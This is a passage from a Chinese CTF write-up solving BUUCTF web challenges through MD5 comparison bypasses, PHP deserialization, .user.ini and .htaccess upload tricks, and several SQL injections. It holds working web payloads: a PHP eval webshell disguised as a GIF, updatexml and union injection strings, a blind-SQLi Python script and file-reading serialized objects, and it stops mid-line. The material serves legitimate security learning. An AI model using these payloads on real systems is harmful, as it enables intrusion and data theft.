class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#x27;password&#x27;])) &#123;</span><br><span class="line">$password = $_POST[&#x27;password&#x27;];</span><br><span class="line">if (is_numeric($password)) &#123;</span><br><span class="line">echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;;</span><br><span class="line">&#125;elseif ($password == 404) &#123;</span><br><span class="line">echo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p><img src="/2021/05/03/BUU-WEB-0x10-0x1F/image-20210418104024465.png" alt="image-20210418104024465"></p><h2 id="0x14-BJDCTF2020-Easy-MD5"><a href="#0x14-BJDCTF2020-Easy-MD5" class="headerlink" title="0x14.[BJDCTF2020]Easy MD5"></a>0x14.[BJDCTF2020]Easy MD5</h2><p>有个hint：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure><p>看了wp之后说是有个ffifdyop，原理是这个字符串被md5哈希了之后会变成276f722736c95d99e921722cf9ed621c，而这歌字符串前几位正好是：’or’6，永为真。</p><p><img src="/2021/05/03/BUU-WEB-0x10-0x1F/image-20210418132914216.png" alt="image-20210418132914216"></p><p>因此拼接后为，相当于万能密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=&#x27;&#x27; or &#x27;6xxxxx&#x27;</span><br></pre></td></tr></table></figure><p>之后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a = $GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line"></span><br><span class="line">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    // wow, glzjin wants a girl friend.</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>这个绕过就有很多方法了，比如<code>php?a[]=1&amp;b[]=2</code>或者构造两组md5值开头为0e的值即可绕过。</p><p>在之后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这里把==换成了===，0e大法失效，只能数组绕过。</p><h2 id="0x15-SUCTF-2019-CheckIn"><a href="#0x15-SUCTF-2019-CheckIn" class="headerlink" title="0x15.[SUCTF 2019]CheckIn"></a>0x15.[SUCTF 2019]CheckIn</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>上传</p><p><img src="/2021/05/03/BUU-WEB-0x10-0x1F/image-20210418161338218.png" alt="image-20210418161338218"></p><p>本题的重点来了，文件包含漏洞，</p><p>user.ini。它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。可谓很广，不像.htaccess有局限性，只能是apache.</p><p>什么是.user.ini？</p><p>这得从php.ini说起了，php.ini是php的默认配置文件，这些配置中，分为几种：</p><p><img src="/2021/05/03/BUU-WEB-0x10-0x1F/image-20210418161711896.png" alt="image-20210418161711896"></p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p><blockquote><p>  <code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p></blockquote><p>要用到的配置：**<code>auto_append_file</code><strong>：</strong>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数**</p><p>比如：<code>auto_prepend_file=1.gif</code></p><p>之后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a? </span><br><span class="line">auto_prepend_file=1.gif`</span><br></pre></td></tr></table></figure><p>关于.user.ini的文章：</p><p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p><h2 id="0x16-ZJCTF-2019-NiZhuanSiWei"><a href="#0x16-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="0x16.[ZJCTF 2019]NiZhuanSiWei"></a>0x16.[ZJCTF 2019]NiZhuanSiWei</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>知识点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data伪协议写入文件</span><br><span class="line">php://filter用于读取源码</span><br><span class="line">php://input用于执行PHP的代码</span><br></pre></td></tr></table></figure><p>首先：</p><p><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;)</code></p><p>data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中然后让file_get_contents函数取读取。构造如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></pre></td></tr></table></figure><p>当然也可以不需要base64，但是一般为了绕过某些过滤都会用到base64。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,welcome to the zjctf</span><br></pre></td></tr></table></figure><p>接下来是file:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure><p>参考反序列化基础的文章：<a href="https://www.freebuf.com/articles/web/167721.html">https://www.freebuf.com/articles/web/167721.html</a></p><p>构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;&#125;</span><br></pre></td></tr></table></figure><p>最终payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="0x17-极客大挑战-2019-HardSQL"><a href="#0x17-极客大挑战-2019-HardSQL" class="headerlink" title="0x17.[极客大挑战 2019]HardSQL"></a>0x17.[极客大挑战 2019]HardSQL</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or(updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1))%23</span><br><span class="line">得到数据库geek</span><br><span class="line"></span><br><span class="line">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))%23</span><br><span class="line">得到表名：H4rDsq1</span><br><span class="line"></span><br><span class="line">or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))%23</span><br><span class="line">得到字段：id,username,password</span><br><span class="line"></span><br><span class="line">查数据：</span><br><span class="line">or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))%23</span><br><span class="line">只查到了一半：XPATH syntax error: &#x27;~1flagflag&#123;b615ddd5-228b-4383-9a&#x27;</span><br><span class="line">可以使用right()语句：</span><br><span class="line">or(updatexml(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1)),0x7e),1))%23</span><br></pre></td></tr></table></figure><h2 id="0x18-CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#0x18-CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="0x18.[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>0x18.[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>找个字典跑了一下，过滤了一些，有些没过滤。</p><p>布尔盲注：</p><p>用的网上的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://07113360-9eb3-4e8d-8085-4284220b1372.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>, <span class="number">127</span>):</span><br><span class="line">            payload = <span class="string">&quot;1^if((ascii(substr((select(flag)from(flag)),%d,1))=%d),0,1)&quot;</span> % (i, j)</span><br><span class="line">            <span class="comment">#或者：0^(ascii(substr((select(flag)from(flag)),%d,1))=%d)</span></span><br><span class="line">            data = &#123;<span class="string">&quot;id&quot;</span>: payload&#125;</span><br><span class="line">            r = requests.post(url, data)</span><br><span class="line">            <span class="comment">#print(payload)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hello, glzjin wants a girlfriend.&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="comment">#res += (chr(j))</span></span><br><span class="line">                <span class="built_in">print</span>(i,<span class="built_in">chr</span>(j))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;end ....&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>其中，异或的^可以起到or的作用</p><p>因为每次跑的时候会漏掉一些，所以将每个都输出，然后将缺少的在打印。</p><h2 id="0x19-网鼎杯-2018-Fakebook"><a href="#0x19-网鼎杯-2018-Fakebook" class="headerlink" title="0x19.[网鼎杯 2018]Fakebook"></a>0x19.[网鼎杯 2018]Fakebook</h2><p>robots.txt有源码泄露</p><p>可能与ssrf有关</p><p>登陆后有SQL注入，对空格有过滤，可以报错注入或者/**/代替空格：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?no=-1 or updatexml(1,concat(&#x27;\~&#x27;,database(),&#x27;\~&#x27;),1)#</span><br><span class="line">数据库名：fakebook </span><br><span class="line"></span><br><span class="line">no=11/**/union/**/select/**/1,group_concat(table_name),3,4/**/from/**/information_schema.tables where table_schema=&#x27;fakebook&#x27; #</span><br><span class="line">表名：users</span><br><span class="line"></span><br><span class="line">no=11/**/union/**/select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.columns where table_schema=&#x27;fakebook&#x27;and table_name=&#x27;users&#x27; #</span><br><span class="line">字段：no,username,passwd,data </span><br><span class="line"></span><br><span class="line">之后返回的是：</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;123123&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:13:&quot;www.baidu.com&quot;;&#125; </span><br></pre></td></tr></table></figure><p><img src="/2021/05/03/BUU-WEB-0x10-0x1F/image-20210503165820953.png" alt="image-20210503165820953"></p><p>那么进行反序列化：</p><p><img src="/2021/05/03/BUU-WEB-0x10-0x1F/image-20210503170124576.png" alt="image-20210503170124576"></p><p>因为blog是在data，所以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1/**/union/**/select/**/1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure><p>源码中有flag。</p><h2 id="0x1A-GXYCTF2019-BabySQli"><a href="#0x1A-GXYCTF2019-BabySQli" class="headerlink" title="0x1A.[GXYCTF2019]BabySQli"></a>0x1A.[GXYCTF2019]BabySQli</h2><p>考点：联合注入添加临时虚拟用户</p><p>随便输入后看源码，</p><blockquote><p>  MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</p></blockquote><p>先base32，之后是64</p><blockquote><p>  select * from user where username = ‘$name’</p></blockquote><p>测试了下是3个字段：</p><blockquote><p>  union select 1,2,3</p></blockquote><p>当username不是admin的时候报错wrong user，否则报wrong password</p><p>将’admin’放在2的位置上报王蓉 password</p><blockquote><p>  union select 1,’admin’,3</p></blockquote><p>mysql当联合查询时，没有的话会在数据库中加入临时的</p><img src="/2021/05/03/BUU-WEB-0x10-0x1F/image-20210503174156981.png" alt="image-20210503174156981" style="zoom:50%;"><p>(实际上应该不用猜，应该是个坑，原题应该有提示密码是md5加密储存的)</p><p>猜测语句是这样的:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$row;</span><br><span class="line">$pass=$_POST[&#x27;pw&#x27;];</span><br><span class="line">if($row[&#x27;username&#x27;]==’admin’)&#123;</span><br><span class="line">if($row[&#x27;password&#x27;]==md5($pass))&#123; </span><br><span class="line">echo $flag; </span><br><span class="line">&#125;else&#123; echo “wrong pass!”; </span><br><span class="line">&#125;&#125;</span><br><span class="line">else&#123; echo “wrong user!”;&#125;</span><br></pre></td></tr></table></figure><p>那么可以这样构造：123的md5：202cb962ac59075b964b07152d234b70</p><p>于是：adf’union select 1,’admin’,’202cb962ac59075b964b07152d234b70’</p><p>pwd为123</p><h2 id="0x1B-网鼎杯-2020-青龙组-AreUSerialz"><a href="#0x1B-网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="0x1B.[网鼎杯 2020 青龙组]AreUSerialz"></a>0x1B.[网鼎杯 2020 青龙组]AreUSerialz</h2><p>看了wp才做出来的，确实感觉这道题挺有意思。</p><p>首先get传str，每个字符要在32到125之间，之后反序列化。</p><p>反序列化时用了__destruct方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">        <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果op为2，赋值为1，溶蚀content赋为空，再之后执行process，这里op与2比较是强比较。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;write();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line"><span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果op是1，进入write，如果是2的话进入output，这里两处都是若比较。</p><p>所以说只要领op=2（整形），那么两处都可以绕过，（第一处绕过字符，第二如直接read）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">        <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>filename可以控制，接着使用file_get_contents函数读文件，这里可以用php://filter伪协议读文件，然后输出。</p><p>但是还有一个问题，$op,$filename,$content这三个都是protected，protected权限的变量序列化的时候会有%00*%00字符，而%00的ASCII编码为0，不能绕过is_valid的检查。</p><p>绕过的话，php7.1+的版本对属性类型不敏感，本地序列化的时候可以使用public绕过。</p><p>（protected/private类型的属性序列化后产生不可打印字符，public类型则不会。）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>总的来说这道题还是很有意思的，学到了很多。</p><h2 id="0x1C-MRCTF2020-你传你🐎呢"><a href="#0x1C-MRCTF2020-你传你🐎呢" class="headerlink" title="0x1C.[MRCTF2020]你传你🐎呢"></a>0x1C.[MRCTF2020]你传你🐎呢</h2><p>上传.htaccess，有几种写法：</p><blockquote><p>  SetHandler application/x-httpd-php</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;bbb&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">//其中bbb是要包含的文件，都会被当做php来执行</span><br></pre></td></tr></table></figure><blockquote>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure></blockquote><p>大致就上面3种写法吧。</p><p>PS：当时一直连不上。。原来是htaccess写成了htacess</p><p>然后就社写马上传蚁剑连接就ok了。</p><h2 id="0x1D-MRCTF2020-Ez-bypass"><a href="#0x1D-MRCTF2020-Ez-bypass" class="headerlink" title="0x1D.[MRCTF2020]Ez_bypass"></a>0x1D.[MRCTF2020]Ez_bypass</h2><p>第一个绕过有两种绕法，之前的一个绕md5的题中也写了：</p><p>第一种：MD5碰撞</p><blockquote><p>  ?gg=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;id=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p></blockquote><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$s1 = &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span><br><span class="line">$s2 = 